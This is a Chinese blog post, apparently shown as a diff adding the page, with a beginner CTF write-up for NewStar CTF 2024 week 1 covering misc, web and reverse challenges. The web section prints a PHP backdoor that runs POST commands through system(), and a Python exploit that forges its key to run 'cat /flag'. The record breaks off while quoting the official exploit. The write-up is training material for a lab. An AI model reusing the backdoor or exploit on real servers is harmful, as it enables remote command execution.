@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="🥧NewStarCTF 2024 校内赛道 week1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar CTF 2024 校内赛道 week1 wp">
+<meta property="og:url" content="https://www.gubaiovo.com/posts/9825a8eb.html">
+<meta property="og:site_name" content="GuBai">
+<meta property="og:description" content="🥧NewStarCTF 2024 校内赛道 week1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ns.openctf.net/assets/base64_4.Da4eP09W.png">
+<meta property="og:image" content="https://ns.openctf.net/assets/base64_6.D7V0so-t.png">
+<meta property="article:published_time" content="2024-10-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-10T16:00:00.000Z">
+<meta property="article:author" content="gubai">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ns.openctf.net/assets/base64_4.Da4eP09W.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NewStar CTF 2024 校内赛道 week1 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/gubaiovo">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">链接</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/475edca7.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.gubaiovo.com/posts/9825a8eb.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.gubaiovo.com/posts/9825a8eb.html&text=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.gubaiovo.com/posts/9825a8eb.html&is_video=false&description=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NewStar CTF 2024 校内赛道 week1 wp&body=Check out this article: https://www.gubaiovo.com/posts/9825a8eb.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.gubaiovo.com/posts/9825a8eb.html&title=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.gubaiovo.com/posts/9825a8eb.html&name=NewStar CTF 2024 校内赛道 week1 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.gubaiovo.com/posts/9825a8eb.html&t=NewStar CTF 2024 校内赛道 week1 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">NewStar CTF 2024 校内赛道 week1 wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1"><span class="toc-number">1.1.</span> <span class="toc-text">week 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WhereIsFlag"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">WhereIsFlag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Labyrinth"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Labyrinth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decompress"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">decompress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pleasingMusic"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">pleasingMusic</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#headache3"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">headache3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E6%A2%B0%E5%8D%B1%E6%9C%BA"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">智械危机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">会赢吗</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#flag1"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag2"><span class="toc-number">1.1.2.3.2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag3"><span class="toc-number">1.1.2.3.3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#flag4"><span class="toc-number">1.1.2.3.4.</span> <span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#end"><span class="toc-number">1.1.2.3.5.</span> <span class="toc-text">end</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">谢谢皮蛋</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.2.4.1.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%BD%A2%E5%BC%8F"><span class="toc-number">1.1.2.4.2.</span> <span class="toc-text">闭合形式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%8F%AF%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%B1%9E%E6%80%A7%E5%88%97%E6%95%B0"><span class="toc-number">1.1.2.4.3.</span> <span class="toc-text">判断可查询的属性列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.1.2.4.4.</span> <span class="toc-text">判断回显位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.4.5.</span> <span class="toc-text">查看当前页面数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.2.4.6.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">1.1.2.4.7.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.2.4.8.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6-1"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">* PangBai 过家家(1)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BA%8F%E7%AB%A0"><span class="toc-number">1.1.2.5.1.</span> <span class="toc-text">序章</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.1.2.5.2.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.1.2.5.3.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">1.1.2.5.4.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3-%E2%86%92end"><span class="toc-number">1.1.2.5.5.</span> <span class="toc-text">第四关 →end</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">1.1.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#begin"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">begin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezAndroidStudy"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">ezAndroidStudy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simple-encryption"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">Simple_encryption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-debug"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">* ez_debug</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NewStar CTF 2024 校内赛道 week1 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">gubai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-10T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-10-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1>NewStar CTF 2024 校内赛道 week1 wp</h1>
+<p>比赛时间：<strong>2024.9.30 - 2024.11.3</strong></p>
+<p>比赛一共五周，难度递增。</p>
+<p>官方 wp：<a target="_blank" rel="noopener" href="https://ns.openctf.net/wp/2024/">WriteUp - NewStar CTF 2024 (openctf.net)</a></p>
+<p>在实际解题过程中未解出的题目使用 <code>*</code> 进行了标记</p>
+<p><strong><input type="checkbox" id="checkbox0"><label for="checkbox0">表示必填，( ) 表示选填，实际填写需要去掉[ ] 和 ( )</label></strong></p>
+<p><strong><em>题目解法不唯一！！！</em></strong></p>
+<p><s>因为刚入门，pwn 的前置知识太多了，所以 pwn 不出来一点（</s></p>
+<h2 id="week-1">week 1</h2>
+<p>第一周非常基础，着重介绍一些 ctf 工具和常用 linux 指令</p>
+<h3 id="Misc">Misc</h3>
+<h4 id="WhereIsFlag">WhereIsFlag</h4>
+<p><s>出题人太癫了</s></p>
+<p>题目主要目的是 linux 基础指令学习</p>
+<p>本题下发了 nc 环境，通过 <code>netcat</code> 工具连接(号称 TCP/IP 的瑞士军刀)。现在流行的 kali 发行版基本都内置了 nc 环境，win 的 nc 环境配置教程可以参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/u013014594/article/details/122751921">csdn</a> 教程。(教程中涉及到修改环境变量，实际上，如果 cmd 运行在 netcat 根目录下，无需配置环境变量)</p>
+<p>这里使用 kali 进行连接，打开 kali 终端(快捷键 <code>ctrl+alt+T</code> )，输入题目 nc 命令</p>
+<p>这里介绍 nc <strong>发起连接</strong> 的基本命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] [端口]</span><br></pre></td></tr></table></figure>
+<p>使用 <code>ls</code> | <code>cd</code> | <code>cat</code> 指令挨个翻就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls (参数) (dirname) # 显示指定工作目录下的内容</span><br><span class="line">	-a：列出包括 . 开头的隐藏文件的所有文件及目录</span><br><span class="line">	-d：只列出目录</span><br><span class="line">	-l：以长格式显示文件和目录信息，包括权限、所有者、创建时间、大小</span><br><span class="line">	-r：倒序显示文件和目录</span><br><span class="line">	-t：按照修改时间排序，最新的文件在最前面</span><br><span class="line">	-A：同 -a ，但不列出 &quot;.&quot; (目前目录) 及 &quot;..&quot; (父目录)</span><br><span class="line">	-F：在列出的文件名后加一符号；例如可执行档则加 &quot;*&quot;, 目录则加 &quot;/&quot;</span><br><span class="line">	-R：递归显示目录中的所有文件和子目录</span><br><span class="line">cd [dirname]  	  		  # 打开指定(相对/绝对)路径文件夹</span><br><span class="line">cat (参数) [filename]   # 打开当前文件夹下的文件并将文件内容并输出</span><br><span class="line">	-n：对所有行显示行号</span><br><span class="line">	-b：对非空行显示行号</span><br><span class="line">	-s：压缩连续空行为一个空行</span><br><span class="line">	-E：每行末尾显示 $ 符号</span><br><span class="line">	-T：将 Tab 字符显示为 ^I</span><br><span class="line">	-v：显示一些非打印字符</span><br></pre></td></tr></table></figure>
+<p>注意文件包含 <code>fake</code> 字样的，尤其是 <code>fake_flag</code> <code>fake_key</code>，是在提示这是假的 flag、假的 key。(谁说学计算机不需要英语的？)</p>
+<h4 id="Labyrinth">Labyrinth</h4>
+<p>题目提示此题为 LSB(最低有效位) 隐写</p>
+<blockquote>
+<p>LSB 即为最低有效位（Least Significant Bit，lsb），我们知道，图片中的图像像素一般是由 RGB 三原色（红绿蓝）组成，每一种颜色占用 8 位，取值范围为 0x00 ~ 0xFF ，即有 256 种颜色，一共包含了 256 的 3 次方的颜色，即 16777216 种颜色。而人类的眼睛可以区分约 1000 万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有 6777216 种。<br>
+LSB 隐写就是修改 RGB 颜色分量的最低二进制位也就是最低有效位，而人类的眼睛不会注意到这前后的变化，每个像数可以携带 3 比特的信息。</p>
+</blockquote>
+<p>解决图片 lsb 隐写有两个很有效的工具：<code>zsteg</code> | <code>Stegsolve</code></p>
+<p><a target="_blank" rel="noopener" href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve</a>：支持 jpg、png、bmp 格式。stegsolve 是一个.jar 文件，运行需要 java 环境。安装 java 环境的教程已经非常多了，这里不赘述了。在 windows 下配置好 java 环境后后双击 .jar 即可打开界面。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hardcoreYutian/p/10613036.html">在 Kali Linux 中下载工具 Stegsolve - 平静的雨田 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/R-S-PY/p/12916983.html">CTF-StegSolve 使用介绍 - AlexANSO - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Amherstieae/article/details/107512398">zsteg</a>：支持 png、bmp。相对来讲比 stegsolve 更方便。(里面也包含了 zsteg 一些基础指令)。</p>
+<p>通过 stegsolve 的左右立体试图(可以通过下方的箭头控制偏移，也可以是左右方向键)，找到二维码，扫描得 flag</p>
+<h4 id="decompress">decompress</h4>
+<p>题目要求将内容 32 位小写 md5 计算后包上 flag{}</p>
+<p>在线工具：<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/DigestAlgorithm/MD5">MD5 哈希 - 锤子在线工具 (toolhelper.cn)</a></p>
+<h4 id="pleasingMusic">pleasingMusic</h4>
+<p>音频隐写，听一遍音乐会发现有明显电报声</p>
+<p>音频工具：<a target="_blank" rel="noopener" href="https://www.audacityteam.org/download/">Audacity ® | Downloads (audacityteam.org)</a></p>
+<p>题目提示音乐需要倒放，在 audacity 中 <code>ctrl+a</code> 全选音轨，<code>效果器-特殊-反向(时间)</code> 进行倒放处理。<code>ctrl + 鼠标滚轮</code> 放大音轨，在电报区域，短音轨代表摩斯密码中的短码<code>.</code> ，长音轨代表长码<code>-</code> ，较大空白部分为间隔。</p>
+<p>提取摩斯密码后解码</p>
+<p>在线工具：<a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/morse">在线摩斯密码翻译器 (lddgo.net)</a></p>
+<p>注：不同在线工具使用的间隔符号不同，有的使用空格，有的使用 \</p>
+<h3 id="Web">Web</h3>
+<h4 id="headache3">headache3</h4>
+<p>打开浏览器开发者工具(快捷键 <code>F12</code>)，在网络窗口查看请求，得到 flag</p>
+<h4 id="智械危机">智械危机</h4>
+<p>题目提示 <code>robots</code> ，可以到 <code>/robots.txt</code> 查看线索</p>
+<blockquote>
+<p>/robots.txt 一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被 robots 访问的部分，或者指定搜索引擎只收录指定的内容。</p>
+</blockquote>
+<p>Disallow 中得到 <code>/backd0or.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);         <span class="comment"># cmd参数是 base64 编码的 system 命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将key base64解码</span></span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">//初始化reversed_cmd</span></span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//将cmd字符串翻转为reversed_cmd</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算翻转后的cmd的md5哈希值</span></span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="comment">//将上一句md5哈希值与base64解码的key进行比较，进行key验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发送post请求</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据 WhereIsFlag 题目中的 <code>cat</code> 指令，可以将目标 cmd 指令设置为 <code>cat /flag</code> ，通过 post 发送请求，在目标服务器执行 cat 指令。</p>
+<p>post 请求要求传入 key 进行验证，所以需要将 decrypt_request 逆向进行</p>
+<ol>
+<li class="lvl-3">
+<p>设置目标 cmd：cat /flag</p>
+</li>
+<li class="lvl-3">
+<p>base64 编码 cmd</p>
+</li>
+<li class="lvl-3">
+<p>翻转编码后的 cmd</p>
+</li>
+<li class="lvl-3">
+<p>计算翻转后的 md5 哈希值，这也是 key 的 base64 解码后的值</p>
+</li>
+<li class="lvl-3">
+<p>将 md5 哈希值进行 base64 编码，得到原始 key</p>
+</li>
+<li class="lvl-3">
+<p>post 请求发送 cmd 和 key</p>
+</li>
+</ol>
+<p>下面分别是我在解题时用的代码和官方 wp 的代码(官方有两个版本，一是常规方案，二是简单的 shell 交互，后者官方推荐)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本人代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># Base64 编码命令</span></span><br><span class="line">    encoded_cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    <span class="comment"># 反转编码后的命令</span></span><br><span class="line">    reversed_cmd = encoded_cmd[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 计算反转命令的 MD5 哈希值</span></span><br><span class="line">    hashed_reversed_cmd =</span><br><span class="line">hashlib.md5(reversed_cmd.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># Base64 编码哈希值</span></span><br><span class="line">    encoded_key =</span><br><span class="line">base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">    <span class="keyword">return</span> encoded_cmd, encoded_key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    encoded_cmd, encoded_key = generate_payload(cmd)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;cmd&#x27;</span>: encoded_cmd,</span><br><span class="line">        <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">return</span> response.text</span><br><span class="line"><span class="comment"># url替换为题目下发的url+/backd0or.php</span></span><br><span class="line">url = <span class="string">&#x27;http://example.com/backd0or.php&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">response = send_request(url, cmd)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 官方代码 常规方案</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for 